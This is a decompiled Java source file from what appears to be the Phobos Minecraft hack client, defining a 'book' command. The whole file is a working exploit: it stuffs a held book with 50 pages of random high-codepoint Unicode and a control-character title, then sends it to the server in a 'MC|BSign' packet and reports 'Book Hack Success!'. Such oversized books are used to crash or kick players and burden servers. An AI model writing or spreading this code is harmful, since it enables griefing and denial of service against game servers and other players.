package me.earth.phobos.features.command.commands;

import io.netty.buffer.Unpooled;
import java.util.Random;
import java.util.stream.Collectors;
import java.util.stream.IntStream;
import me.earth.phobos.Phobos;
import me.earth.phobos.features.command.Command;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketCustomPayload;

public class BookCommand extends Command {
   public BookCommand() {
      super("book", new String[0]);
   }

   public void execute(String[] commands) {
      ItemStack heldItem = mc.field_71439_g.func_184614_ca();
      if (heldItem.func_77973_b() == Items.field_151099_bA) {
         int limit = true;
         Random rand = new Random();
         IntStream characterGenerator = rand.ints(128, 1112063).map((ix) -> {
            return ix < 55296 ? ix : ix + 2048;
         });
         String joinedPages = (String)characterGenerator.limit(10500L).mapToObj((ix) -> {
            return String.valueOf((char)ix);
         }).collect(Collectors.joining());
         NBTTagList pages = new NBTTagList();

         for(int page = 0; page < 50; ++page) {
            pages.func_74742_a(new NBTTagString(joinedPages.substring(page * 210, (page + 1) * 210)));
         }

         if (heldItem.func_77942_o()) {
            heldItem.func_77978_p().func_74782_a("pages", pages);
         } else {
            heldItem.func_77983_a("pages", pages);
         }

         StringBuilder stackName = new StringBuilder();

         for(int i = 0; i < 16; ++i) {
            stackName.append("\u0014\f");
         }

         heldItem.func_77983_a("author", new NBTTagString(mc.field_71439_g.func_70005_c_()));
         heldItem.func_77983_a("title", new NBTTagString(stackName.toString()));
         PacketBuffer buf = new PacketBuffer(Unpooled.buffer());
         buf.func_150788_a(heldItem);
         mc.field_71439_g.field_71174_a.func_147297_a(new CPacketCustomPayload("MC|BSign", buf));
         sendMessage(Phobos.commandManager.getPrefix() + "Book Hack Success!");
      } else {
         sendMessage(Phobos.commandManager.getPrefix() + "b1g 3rr0r!");
      }

   }
}
